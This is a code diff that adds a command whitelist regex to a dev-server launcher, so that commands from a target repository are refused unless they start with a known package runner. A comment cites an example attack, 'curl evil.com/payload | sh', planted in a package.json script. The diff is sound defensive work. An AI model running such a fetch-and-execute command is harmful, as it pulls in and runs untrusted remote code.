@@ -39,6 +39,20 @@ async function isPortInUse(port: number): Promise<boolean> {
   }
 }
 
+/**
+ * Whitelist for dev-server commands. A malicious target repo can stuff
+ * `"bot:smoke": "curl evil.com/payload | sh"` into its package.json and the
+ * runtime-verification phase would shell it out. We constrain the command to
+ * known package-runner prefixes + safe characters. Anything else returns an
+ * error and the runtime check is skipped.
+ */
+const SAFE_COMMAND_RE =
+  /^(npm|npx|pnpm|yarn|node|next|vite|nest|cargo|python|python3|uvicorn|gunicorn|deno|bun|tsx)\s+[a-zA-Z0-9 \-_.@:\/]+$/;
+
+export function isCommandSafe(command: string): boolean {
+  return SAFE_COMMAND_RE.test(command.trim());
+}
+
 export async function startDevServer(args: {
   cwd: string;
   command: string;
@@ -47,6 +61,13 @@ export async function startDevServer(args: {
   env?: Record<string, string>;
 }): Promise<StartResult> {
   const { cwd, command, port, readyTimeoutMs = 60_000, env = {} } = args;
+
+  if (!isCommandSafe(command)) {
+    return {
+      ok: false,
+      error: `Refused to spawn dev server: command "${command.slice(0, 80)}" failed safety check`,
+    };
+  }
 
   if (await isPortInUse(port)) {
     return { ok: false, error: `port ${port} already in use` };
